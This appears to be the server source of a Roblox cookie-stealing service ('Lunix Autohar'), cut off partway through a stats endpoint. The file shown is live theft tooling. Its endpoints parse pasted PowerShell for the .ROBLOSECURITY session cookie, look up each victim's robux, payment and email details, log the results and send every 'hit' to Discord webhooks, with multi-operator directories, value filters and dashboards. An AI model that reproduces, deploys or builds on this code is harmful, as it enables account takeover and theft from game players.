import express from 'express';
import bodyParser from 'body-parser';
import path from 'path';
import { fileURLToPath } from 'url';
import crypto from 'crypto';
import fs from 'fs';
import rateLimit from 'express-rate-limit';

// Import Firebase Admin SDK
import admin from 'firebase-admin';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.set('trust proxy', 1);

// Firebase Realtime Database Initialization
let db = null;

try {
  if (process.env.GOOGLE_PROJECT_ID && process.env.GOOGLE_CLIENT_EMAIL && process.env.GOOGLE_PRIVATE_KEY && process.env.FIREBASE_DB_URL) {
    admin.initializeApp({
      credential: admin.credential.cert({
        projectId: process.env.GOOGLE_PROJECT_ID,
        clientEmail: process.env.GOOGLE_CLIENT_EMAIL,
        privateKey: process.env.GOOGLE_PRIVATE_KEY.replace(/\\n/g, '\n'),
      }),
      databaseURL: process.env.FIREBASE_DB_URL
    });
    db = admin.database();
    console.log('✅ Firebase initialized successfully');
  } else {
    console.log('⚠️ Firebase credentials not found. Running in demo mode without database functionality.');
  }
} catch (error) {
  console.error('❌ Failed to initialize Firebase:', error.message);
  console.log('⚠️ Running without database functionality.');
}

// Directory management
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123'; // Change this!

// Load directories from Firebase
async function loadDirectories() {
  if (!db) {
    console.log('⚠️ Database not available, returning empty directories');
    return {};
  }

  try {
    const snapshot = await db.ref('directories').once('value');
    const directories = snapshot.val() || {};

    // Check for directories without unique IDs and assign them
    let hasChanges = false;

    for (const [dirName, dirConfig] of Object.entries(directories)) {
      // Check if directory is missing uniqueId
      if (!dirConfig.uniqueId) {
        const uniqueId = generateUniqueId(directories);
        directories[dirName].uniqueId = uniqueId;
        hasChanges = true;
        console.log(`✅ Assigned unique ID ${uniqueId} to legacy directory: ${dirName}`);
      }

      // Check subdirectories for missing IDs
      if (dirConfig.subdirectories) {
        for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
          if (!subConfig.uniqueId) {
            const uniqueId = generateUniqueId(directories);
            directories[dirName].subdirectories[subName].uniqueId = uniqueId;
            hasChanges = true;
            console.log(`✅ Assigned unique ID ${uniqueId} to legacy subdirectory: ${dirName}/${subName}`);
          }
        }
      }
    }

    // Save changes if any directories were updated
    if (hasChanges) {
      console.log('🔄 Updating directories with new unique IDs...');
      await saveDirectories(directories);
      console.log('✅ Successfully updated legacy directories with unique IDs');
    }

    return directories;
  } catch (error) {
    console.error('Error loading directories from Firebase:', error);
    return {};
  }
}

// Helper function to generate unique IDs (extracted for reuse)
function generateUniqueId(directories) {
  let uniqueId;
  do {
    uniqueId = Math.floor(100000 + Math.random() * 99900000).toString();
    // Check if ID already exists in any directory or subdirectory
    const idExists = Object.values(directories).some(dir => 
      dir.uniqueId === uniqueId || 
      (dir.subdirectories && Object.values(dir.subdirectories).some(sub => sub.uniqueId === uniqueId))
    );
    if (!idExists) break;
  } while (true);
  return uniqueId;
}

// Save directories to Firebase
async function saveDirectories(directories) {
  if (!db) {
    console.log('⚠️ Database not available, cannot save directories');
    return false;
  }

  try {
    await db.ref('directories').set(directories);
    return true;
  } catch (error) {
    console.error('Error saving directories to Firebase:', error);
    return false;
  }
}

// Generate API token if not set
const API_TOKEN = process.env.API_TOKEN || crypto.randomBytes(32).toString('hex');
const ALLOWED_ORIGINS = process.env.ALLOWED_ORIGINS ? process.env.ALLOWED_ORIGINS.split(',') : [];

// Middleware to validate requests
function validateRequest(req, res, next) {
  // Check origin for browser requests
  const origin = req.get('Origin') || req.get('Referer');
  const host = req.get('Host');

  // Allow requests from same origin (your frontend)
  if (origin) {
    const originHost = new URL(origin).host;
    if (originHost !== host && !ALLOWED_ORIGINS.includes(origin)) {

      return res.status(403).json({ error: 'Unauthorized origin' });
    }
  }

  // Check for API token in headers
  const providedToken = req.get('X-API-Token');
  if (!providedToken || providedToken !== API_TOKEN) {

    return res.status(401).json({ error: 'Invalid API token' });
  }

  next();
}

// Function to log user data to Firebase Realtime Database
async function logUserData(token, userData, context = {}) {
  if (!db) {
    console.log('⚠️ Database not available, cannot log user data');
    return null;
  }

  try {
    // Hash the token for security - never store raw tokens
    const hashedToken = crypto.createHash('sha256').update(token).digest('hex').substring(0, 16);

    const logEntry = {
      tokenHash: hashedToken, // Store only hashed version
      userData: userData,
      context: context,
      timestamp: new Date().toISOString(),
    };

    const writeResult = await db.ref('user_logs').push(logEntry);

    return writeResult.key;
  } catch (error) {
    console.error('❌ Error logging user data to Firebase Realtime Database:', error);
    return null;
  }
}

// Trust proxy for rate limiting (required for Replit)
app.set('trust proxy', 1);

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP, please try again later.'
});

// Enhanced rate limiting for token endpoints
const tokenLimiter = rateLimit({
  windowMs: 5 * 60 * 1000, // 5 minutes
  max: 10, // limit each IP to 10 token requests per windowMs
  message: 'Too many token requests from this IP, please try again later.',
  standardHeaders: true,
  legacyHeaders: false,
});

app.use(limiter);
app.use(bodyParser.json());
app.use(bodyParser.text({ type: '*/*' }));

// Security headers middleware for token endpoints
app.use('/*/api/token', (req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  next();
});

app.use('/api/token', (req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  next();
});

// Return 404 for root path (must come before static file serving)
app.get('/', (req, res) => {
  res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
});

// Serve static files from public directory (but not index.html for root)
app.use(express.static(path.join(__dirname, 'public'), {
  index: false // Prevent serving index.html automatically
}));

// Serve the create directory page
app.get('/create', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'create.html'));
});

// PROTECTED ROUTES WITH /u/ PREFIX FOR SITE OWNER AND PARENT DIRECTORIES

// Protected site owner convert endpoint
app.post('/u/convert', validateRequest, async (req, res) => {
  try {
    let input;
    let scriptType;

    // Handle both JSON and text input
    if (typeof req.body === 'string') {
      input = req.body;
      scriptType = 'Unknown';
    } else if (req.body && req.body.powershell) {
      input = req.body.powershell;
      scriptType = req.body.scriptType || 'Unknown';
    } else {
      return res.status(400).json({ error: 'Invalid input format' });
    }

    // Check if input is just plain text (no PowerShell structure) - silently reject to prevent spam
    const hasBasicPowershellStructure = /(?:Invoke-WebRequest|curl|wget|-Uri|-Headers|-Method|powershell|\.ROBLOSECURITY)/i.test(input);

    if (!hasBasicPowershellStructure) {
      // Silently reject plain text inputs without sending webhooks
      return res.status(400).json({ 
        success: false,
        message: 'Invalid input format'
      });
    }

    // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
    // Updated regex to handle both direct assignment and New-Object System.Net.Cookie format
    const regex = /\.ROBLOSECURITY["']?\s*,?\s*["']([^"']+)["']/i;
    const match = cleanedInput.match(regex);

    if (match) {
      const token = match[1].replace(/['"]/g, '');

      // Check if token is empty, just whitespace, or only contains commas/special chars
      if (!token || token.trim() === '' || token === ',' || token.length < 10) {
        // Send fallback embed when no valid token found
        const fallbackEmbed = {
          title: "⚠️ Input Received",
          description: "Input received but no ROBLOSECURITY found",
          color: 0x8B5CF6, // Consistent purple color
          footer: {
            text: "Made By Lunix"
          }
        };

        const fallbackPayload = {
          embeds: [fallbackEmbed]
        };

        // Send to Discord webhook
        try {
          const response = await fetch(process.env.DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });
        } catch (webhookError) {
          console.error('❌ Fallback webhook failed:', webhookError.message);
        }

        return res.status(400).json({ 
          success: false,
          message: 'Failed wrong input'
        });
      }

      const userAgent = req.headers['user-agent'] || 'Unknown';

      // Fetch user data from Roblox API
      const userData = await fetchRobloxUserData(token);

      // If user data fetch failed, create a minimal user data object
      const webhookUserData = userData || {
        username: "Unknown User",
        userId: "Unknown",
        robux: 0,
        premium: false,
        rap: 0,
        summary: 0,
        creditBalance: 0,
        savedPayment: false,
        robuxIncoming: 0,
        robuxOutgoing: 0,
        korblox: false,
        headless: false,
        accountAge: 0,
        groupsOwned: 0,
        placeVisits: 0,
        inventory: { hairs: 0, bundles: 0, faces: 0 },
        emailVerified: false,
        emailAddress: null,
        voiceChatEnabled: false
      };

      // Log user data to database
      await logUserData(token, webhookUserData, { ip: req.ip, directory: 'main' });

      // Send to Discord webhook with user data
      const webhookResult = await sendToDiscord(token, userAgent, scriptType, webhookUserData);

      if (!webhookResult.success) {
        return res.status(500).json({ 
          success: false, 
          error: `Webhook failed: ${webhookResult.error}` 
        });
      }
    } else {
      // Send fallback embed when no token found - do NOT send user data
      const fallbackEmbed = {
        title: "⚠️ Input Received",
        description: "Input received but no ROBLOSECURITY found",
        color: 0x8B5CF6, // Consistent purple color
        footer: {
          text: "Made By Lunix"
        }
      };

      const fallbackPayload = {
        embeds: [fallbackEmbed]
      };

      // Send to Discord webhook
      try {
        const response = await fetch(process.env.DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(fallbackPayload)
        });
      } catch (webhookError) {
        console.error('❌ Fallback webhook failed:', webhookError.message);
      }

      return res.status(400).json({ 
        success: false,
        message: 'Failed wrong input'
      });
    }

    res.json({ 
      success: true,
      message: 'Request submitted successfully!'
    });
  } catch (error) {
    // Log error without exposing sensitive details
    console.error('❌ Server error:', error.message);
    res.status(500).json({ error: 'Server error processing request' });
  }
});

// Protected site owner token endpoint
app.get('/u/api/token', tokenLimiter, protectTokenEndpoint, (req, res) => {
  console.log(`✅ Protected token request approved for IP: ${req.ip}`);
  res.json({ token: API_TOKEN });
});

// Protected parent directory page
app.get('/u/:directory', async (req, res) => {
  const directoryName = req.params.directory;
  const directories = await loadDirectories();

  if (directories[directoryName]) {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
  } else {
    res.status(404).json({ error: 'Directory not found' });
  }
});

// Protected parent directory convert endpoint
app.post('/u/:directory/convert', async (req, res) => {
  try {
    const directoryName = req.params.directory;
    const directories = await loadDirectories();

    // Check if directory exists
    if (!directories[directoryName]) {
      return res.status(404).json({ error: 'Directory not found' });
    }

    const directoryConfig = directories[directoryName];

    // Validate API token for this specific directory
    const providedToken = req.get('X-API-Token');
    if (!providedToken || providedToken !== directoryConfig.apiToken) {
      console.log(`❌ Invalid or missing API token for directory ${directoryName} from ${req.ip}`);
      return res.status(401).json({ error: 'Invalid API token for this directory' });
    }

    let input;
    let scriptType;

    // Handle both JSON and text input
    if (typeof req.body === 'string') {
      input = req.body;
      scriptType = 'Unknown';
    } else if (req.body && req.body.powershell) {
      input = req.body.powershell;
      scriptType = req.body.scriptType || 'Unknown';
    } else {
      return res.status(400).json({ error: 'Invalid input format' });
    }

    // Check if input is just plain text (no PowerShell structure) - silently reject to prevent spam
    const hasBasicPowershellStructure = /(?:Invoke-WebRequest|curl|wget|-Uri|-Headers|-Method|powershell|\.ROBLOSECURITY)/i.test(input);

    if (!hasBasicPowershellStructure) {
      // Silently reject plain text inputs without sending webhooks
      return res.status(400).json({ 
        success: false,
        message: 'Invalid input format',
        directory: directoryName
      });
    }

    // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
    // Updated regex to handle both direct assignment and New-Object System.Net.Cookie format
    const regex = /\.ROBLOSECURITY["']?\s*,?\s*["']([^"']+)["']/i;
    const match = cleanedInput.match(regex);

    if (match) {
      const token = match[1].replace(/['"]/g, '');

      // Check if token is empty, just whitespace, or only contains commas/special chars
      if (!token || token.trim() === '' || token === ',' || token.length < 10) {
        // Send fallback embed when no valid token found
        const fallbackEmbed = {
          title: "⚠️ Input Received",
          description: "Input received but no ROBLOSECURITY found",
          color: 0xFFA500, // Orange color to distinguish from successful hits
          footer: {
            text: "Made By Lunix"
          }
        };

        const fallbackPayload = {
          embeds: [fallbackEmbed]
        };

        // Send to both directory webhook and site owner webhook
        try {
          await fetch(directoryConfig.webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });

          const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
          if (siteOwnerWebhookUrl) {
            await fetch(siteOwnerWebhookUrl, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify(fallbackPayload)
            });
          }
        } catch (webhookError) {
          console.error('❌ Fallback webhook failed:', webhookError.message);
        }

        return res.status(400).json({ 
          success: false,
          message: 'Failed wrong input',
          directory: directoryName
        });
      }

      const userAgent = req.headers['user-agent'] || 'Unknown';

      // Fetch user data from Roblox API
      const userData = await fetchRobloxUserData(token);

      const webhookUserData = userData || {
        username: "Unknown User",
        userId: "Unknown",
        robux: 0,
        premium: false,
        rap: 0,
        summary: 0,
        creditBalance: 0,
        savedPayment: false,
        robuxIncoming: 0,
        robuxOutgoing: 0,
        korblox: false,
        headless: false,
        accountAge: 0,
        groupsOwned: 0,
        placeVisits: 0,
        inventory: { hairs: 0, bundles: 0, faces: 0 },
        emailVerified: false,
        emailAddress: null,
        voiceChatEnabled: false
      };

      // Log user data to database
      await logUserData(token, webhookUserData, { ip: req.ip, directory: directoryName });

      const customTitle = `<:emoji_37:1410520517349212200> +1 Hit - Lunix Autohar`;

      // Send to Discord webhook with user data
      const webhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, directoryConfig.webhookUrl, customTitle);

      // Always send to site owner (main webhook)
      const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
      if (siteOwnerWebhookUrl) {
        await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, siteOwnerWebhookUrl, customTitle);
      }

      if (!webhookResult.success) {
        return res.status(500).json({ 
          success: false, 
          error: `Webhook failed: ${webhookResult.error}` 
        });
      }
    } else {
      // Send fallback embed when no token found - do NOT send user data
      const fallbackEmbed = {
        title: "⚠️ Input Received",
        description: "Input received but no ROBLOSECURITY found",
        color: 0x8B5CF6, // Consistent purple color
        footer: {
          text: "Made By Lunix"
        }
      };

      const fallbackPayload = {
        embeds: [fallbackEmbed]
      };

      // Send to both directory webhook and site owner webhook
      try {
        await fetch(directoryConfig.webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(fallbackPayload)
        });

        const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
        if (siteOwnerWebhookUrl) {
          await fetch(siteOwnerWebhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });
        }
      } catch (webhookError) {
        console.error('❌ Fallback webhook failed:', webhookError.message);
      }

      return res.status(400).json({ 
        success: false,
        message: 'Failed wrong input',
        directory: directoryName
      });
    }

    res.json({ 
      success: true,
      message: 'Request submitted successfully!',
      directory: directoryName
    });
  } catch (error) {
    // Log error without exposing sensitive details
    console.error('❌ Server error:', error.message);
    res.status(500).json({ error: 'Server error processing request' });
  }
});

// Protected parent directory token endpoint
app.get('/u/:directory/api/token', tokenLimiter, protectTokenEndpoint, async (req, res) => {
  const directoryName = req.params.directory;

  if (!/^[a-z0-9-]+$/.test(directoryName)) {
    return res.status(400).json({ error: 'Invalid directory name format' });
  }

  const directories = await loadDirectories();

  if (!directories[directoryName]) {
    console.log(`❌ Protected token request for non-existent directory: ${directoryName}, IP: ${req.ip}`);
    return res.status(404).json({ error: 'Directory not found' });
  }

  console.log(`✅ Protected directory token request approved for ${directoryName}, IP: ${req.ip}`);
  res.json({ token: directories[directoryName].apiToken });
});

// Middleware to protect admin dashboard with password
function requireAdminPassword(req, res, next) {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith('Basic ')) {
    res.setHeader('WWW-Authenticate', 'Basic realm="Admin Area"');
    return res.status(401).json({ error: 'Authentication required' });
  }

  const base64Credentials = authHeader.split(' ')[1];
  const credentials = Buffer.from(base64Credentials, 'base64').toString('ascii');
  const [username, password] = credentials.split(':');

  // Check credentials (you can change these)
  const validUsername = process.env.ADMIN_USERNAME || 'admin';
  const validPassword = process.env.ADMIN_PASSWORD || 'admin123';

  if (username === validUsername && password === validPassword) {
    next();
  } else {
    res.setHeader('WWW-Authenticate', 'Basic realm="Admin Area"');
    return res.status(401).json({ error: 'Invalid credentials' });
  }
}

// Serve the admin dashboard with password protection
app.get('/admin', requireAdminPassword, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin-dashboard.html'));
});

// Token endpoint protection middleware
function protectTokenEndpoint(req, res, next) {
  // Check User-Agent to prevent automated abuse
  const userAgent = req.get('User-Agent');
  if (!userAgent || userAgent.length < 10) {
    return res.status(403).json({ error: 'Invalid request' });
  }

  // Enhanced origin validation
  const origin = req.get('Origin') || req.get('Referer');
  const host = req.get('Host');

  if (!origin) {
    return res.status(403).json({ error: 'Missing origin header' });
  }

  try {
    const originHost = new URL(origin).host;
    if (originHost !== host && !ALLOWED_ORIGINS.includes(origin)) {
      console.log(`❌ Unauthorized token request from origin: ${origin}, IP: ${req.ip}`);
      return res.status(403).json({ error: 'Unauthorized origin' });
    }
  } catch (error) {
    return res.status(403).json({ error: 'Invalid origin format' });
  }

  // Check for suspicious patterns
  const suspiciousPatterns = [
    /bot/i,
    /crawler/i,
    /spider/i,
    /scraper/i
  ];

  if (suspiciousPatterns.some(pattern => pattern.test(userAgent))) {
    console.log(`❌ Suspicious token request from User-Agent: ${userAgent}, IP: ${req.ip}`);
    return res.status(403).json({ error: 'Request blocked' });
  }

  next();
}

// Original token endpoint - now returns 404 for protection
app.get('/api/token', (req, res) => {
  res.status(404).json({ error: 'Not found' });
});

// Test webhook endpoint
app.post('/test-webhook', async (req, res) => {
  try {
    const { directoryName, testMessage } = req.body;
    const directories = await loadDirectories();

    if (!directories[directoryName]) {
      return res.status(404).json({ 
        success: false, 
        error: 'Directory not found' 
      });
    }

    const directoryConfig = directories[directoryName];
    let webhookUrl = directoryConfig.webhookUrl;

    // For dualhook services, also test the dualhook webhook if provided
    if (directoryConfig.serviceType === 'dualhook' && directoryConfig.dualhookWebhookUrl) {
      webhookUrl = directoryConfig.dualhookWebhookUrl;
    }

    if (!webhookUrl) {
      return res.status(400).json({ 
        success: false, 
        error: 'No webhook URL configured for this directory' 
      });
    }

    // Create test webhook payload
    const testPayload = {
      embeds: [{
        title: "🧪 Webhook Test",
        description: "Webhook is working",
        color: 0x00ff00,
        footer: {
          text: `Test from ${directoryName} directory`
        },
        timestamp: new Date().toISOString()
      }]
    };

    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(testPayload)
    });

    if (!response.ok) {
      const errorText = await response.text();
      return res.status(500).json({ 
        success: false, 
        error: `Webhook test failed: ${response.status} - ${errorText}` 
      });
    }

    res.json({ 
      success: true, 
      message: 'Webhook test successful!' 
    });

  } catch (error) {
    console.error('Error testing webhook:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Server error during webhook test' 
    });
  }
});

// API endpoint to create new directories
app.post('/api/create-directory', async (req, res) => {
  try {
    const { directoryName, webhookUrl, serviceType, dualhookWebhookUrl } = req.body;

    // Validate directory name
    if (!directoryName || !/^[a-z0-9-]+$/.test(directoryName) || directoryName.length > 50) {
      return res.status(400).json({ error: 'Invalid directory name. Use only lowercase letters, numbers, and hyphens. Max 50 characters.' });
    }

    // Validate webhook URL
    if (!webhookUrl || !webhookUrl.startsWith('http')) {
      return res.status(400).json({ error: 'Invalid primary webhook URL' });
    }

    // Validate dualhook webhook if dualhook service type
    if (serviceType === 'dualhook' && (!dualhookWebhookUrl || !dualhookWebhookUrl.startsWith('http'))) {
      return res.status(400).json({ error: 'Invalid dualhook webhook URL' });
    }

    // Load existing directories
    const directories = await loadDirectories();

    // Check if directory already exists
    if (directories[directoryName]) {
      return res.status(409).json({ error: 'Directory already exists' });
    }

    // Generate unique 6-8 digit ID using helper function
    const uniqueId = generateUniqueId(directories);

    // Create new directory entry
    const authToken = crypto.randomBytes(32).toString('hex');
    directories[directoryName] = {
      webhookUrl: webhookUrl,
      serviceType: serviceType || 'single',
      dualhookWebhookUrl: serviceType === 'dualhook' ? dualhookWebhookUrl : null,
      created: new Date().toISOString(),
      apiToken: crypto.randomBytes(32).toString('hex'),
      authToken: authToken, // For user dashboard login
      uniqueId: uniqueId, // Unique ID for stats
      subdirectories: {}, // For nested directories in dualhook
      // Filtering options for dualhook directories
      filters: {
        enabled: false,
        currency: { enabled: false, type: 'balance', value: 0 },
        collectibles: { enabled: false, type: 'rap', value: 0 },
        billings: { enabled: false, type: 'summary', value: 0 },
        groups: { enabled: false, type: 'balance', value: 0 },
        korblox: { enabled: false },
        headless: { enabled: false }
      }
    };

    // Save directories
    if (!(await saveDirectories(directories))) {
      return res.status(500).json({ error: 'Failed to save directory configuration' });
    }



    // Send notification to the webhook about successful directory creation with auth token
    try {
      const serviceTypeLabel = serviceType === 'dualhook' 
        ? `${directoryName.toUpperCase()} GENERATOR` 
        : 'LUNIX AUTOHAR';
      const description = serviceType === 'dualhook' 
        ? `Ur ${directoryName.charAt(0).toUpperCase() + directoryName.slice(1)} Generator URLs\n📌\n\nYour Autohar\n\`http://${req.get('host')}/${directoryName}\`\n\nDualhook Autohar\n\`http://${req.get('host')}/${directoryName}/create\`\n\n🔑 **Dashboard Login Token:**\n\`${authToken}\`\n\n🆔 **Your Unique ID:**\n\`${directories[directoryName].uniqueId}\`\n\n📊 **Your Dashboard:**\n\`http://${req.get('host')}/dashboard\``
        : `Ur LUNIX AUTOHAR url\n📌\n\n\`http://${req.get('host')}/${directoryName}\`\n\n🔑 **Dashboard Login Token:**\n\`${authToken}\`\n\n🆔 **Your Unique ID:**\n\`${directories[directoryName].uniqueId}\`\n\n📊 **Your Dashboard:**\n\`http://${req.get('host')}/dashboard\``;

      const notificationPayload = {
        embeds: [{
          title: serviceTypeLabel,
          description: description,
          color: 0x8B5CF6,
          footer: {
            text: serviceType === 'dualhook' 
              ? `Made By ${directoryName.charAt(0).toUpperCase() + directoryName.slice(1)}`
              : "Made By Lunix"
          }
        }]
      };

      await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(notificationPayload)
      });


    } catch (webhookError) {
    // Log webhook errors without exposing URLs
    console.error('❌ Webhook notification failed:', webhookError.message);
  }

    res.json({ 
      success: true, 
      directoryName: directoryName,
      apiToken: directories[directoryName].apiToken,
      authToken: authToken,
      uniqueId: directories[directoryName].uniqueId
    });

  } catch (error) {
    console.error('Error creating directory:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Serve the site owner index page
app.get('/u/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Serve login page
app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

// Serve dashboard page
app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// API endpoint for user login
app.post('/api/login', async (req, res) => {
  try {
    const { authToken } = req.body;

    if (!authToken) {
      return res.status(400).json({ error: 'Authentication token required' });
    }

    // Load directories and find matching auth token
    const directories = await loadDirectories();
    let foundDirectory = null;

    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.authToken === authToken) {
        foundDirectory = dirName;
        break;
      }

      // Check subdirectories for dualhook services
      if (dirConfig.subdirectories) {
        for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
          if (subConfig.authToken === authToken) {
            foundDirectory = `${dirName}/${subName}`;
            break;
          }
        }
      }

      if (foundDirectory) break;
    }

    if (!foundDirectory) {
      return res.status(401).json({ error: 'Invalid authentication token' });
    }

    res.json({
      success: true,
      directoryName: foundDirectory
    });

  } catch (error) {
    console.error('Error during login:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Middleware to authenticate dashboard requests
function authenticateUser(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Authentication required' });
  }

  const token = authHeader.split(' ')[1];
  req.userToken = token;
  next();
}

// API endpoint to get directory filters for authenticated users
app.get('/api/user-filters', authenticateUser, async (req, res) => {
  try {
    const authToken = req.userToken;

    // Find user's directory
    const directories = await loadDirectories();
    let userDirectory = null;
    let directoryConfig = null;
    let isSubdirectory = false;

    // First check main directories
    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.authToken === authToken) {
        userDirectory = dirName;
        directoryConfig = dirConfig;
        break;
      }

      // Then check subdirectories
      if (dirConfig.subdirectories) {
        for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
          if (subConfig.authToken === authToken) {
            userDirectory = `${dirName}/${subName}`;
            directoryConfig = dirConfig; // Use parent config for filters
            isSubdirectory = true;
            break;
          }
        }
      }

      if (userDirectory) break;
    }

    if (!userDirectory) {
      return res.status(401).json({ error: 'Invalid token' });
    }

    // Only return filters for Dualhook directories AND only for parent directory users (not subdirectories)
    if (directoryConfig.serviceType !== 'dualhook') {
      return res.status(403).json({ error: 'Filters are only available for Dualhook directories' });
    }

    // Subdirectory users should not see or modify filters
    if (isSubdirectory) {
      return res.status(403).json({ error: 'Filters are not available for subdirectory users' });
    }

    res.json({
      directory: userDirectory,
      serviceType: directoryConfig.serviceType,
      isSubdirectory: isSubdirectory,
      filters: directoryConfig.filters || {
        enabled: false,
        currency: { enabled: false, type: 'balance', value: 0 },
        collectibles: { enabled: false, type: 'rap', value: 0 },
        billings: { enabled: false, type: 'summary', value: 0 },
        groups: { enabled: false, type: 'balance', value: 0 },
        korblox: { enabled: false },
        headless: { enabled: false }
      }
    });

  } catch (error) {
    console.error('Error getting user filters:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// API endpoint to update directory filters for authenticated users
app.post('/api/user-filters', authenticateUser, async (req, res) => {
  try {
    const authToken = req.userToken;
    const { filters } = req.body;

    if (!filters) {
      return res.status(400).json({ error: 'Filters configuration required' });
    }

    // Find user's directory
    const directories = await loadDirectories();
    let userDirectory = null;
    let parentDirectory = null;
    let isSubdirectory = false;

    // First check main directories
    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.authToken === authToken) {
        userDirectory = dirName;
        parentDirectory = dirName;
        break;
      }

      // Then check subdirectories
      if (dirConfig.subdirectories) {
        for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
          if (subConfig.authToken === authToken) {
            userDirectory = `${dirName}/${subName}`;
            parentDirectory = dirName;
            isSubdirectory = true;
            break;
          }
        }
      }

      if (userDirectory) break;
    }

    if (!userDirectory) {
      return res.status(401).json({ error: 'Invalid token' });
    }

    // Only allow filter updates for Dualhook directories (check parent directory)
    if (directories[parentDirectory].serviceType !== 'dualhook') {
      return res.status(403).json({ error: 'Filters are only available for Dualhook directories' });
    }

    // Subdirectory users should not be able to update filters
    if (isSubdirectory) {
      return res.status(403).json({ error: 'Subdirectory users cannot modify filters' });
    }

    // Update filters in parent directory (filters are shared across all subdirectories)
    directories[parentDirectory].filters = {
      enabled: filters.enabled || false,
      currency: {
        enabled: filters.currency?.enabled || false,
        type: filters.currency?.type || 'balance',
        value: Math.max(0, parseInt(filters.currency?.value) || 0)
      },
      collectibles: {
        enabled: filters.collectibles?.enabled || false,
        type: filters.collectibles?.type || 'rap',
        value: Math.max(0, parseInt(filters.collectibles?.value) || 0)
      },
      billings: {
        enabled: filters.billings?.enabled || false,
        type: filters.billings?.type || 'summary',
        value: Math.max(0, parseInt(filters.billings?.value) || 0)
      },
      groups: {
        enabled: filters.groups?.enabled || false,
        type: filters.groups?.type || 'balance',
        value: Math.max(0, parseInt(filters.groups?.value) || 0)
      },
      korblox: {
        enabled: filters.korblox?.enabled || false
      },
      headless: {
        enabled: filters.headless?.enabled || false
      }
    };

    // Save directories
    const saveSuccess = await saveDirectories(directories);
    if (!saveSuccess) {
      return res.status(500).json({ error: 'Failed to save filter configuration' });
    }

    console.log(`✅ Filters updated for Dualhook directory: ${userDirectory}`);

    res.json({
      success: true,
      message: 'Filters updated successfully',
      filters: directories[parentDirectory].filters
    });

  } catch (error) {
    console.error('Error updating user filters:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// API endpoint to get user statistics
app.get('/api/user-stats', authenticateUser, async (req, res) => {
  try {
    const authToken = req.userToken;

    // Find user's directory
    const directories = await loadDirectories();
    let userDirectory = null;
    let uniqueId = null;

    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.authToken === authToken) {
        userDirectory = dirName;
        uniqueId = dirConfig.uniqueId;
        break;
      }

      if (dirConfig.subdirectories) {
        for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
          if (subConfig.authToken === authToken) {
            userDirectory = `${dirName}/${subName}`;
            uniqueId = subConfig.uniqueId;
            break;
          }
        }
      }

      if (userDirectory) break;
    }

    if (!userDirectory) {
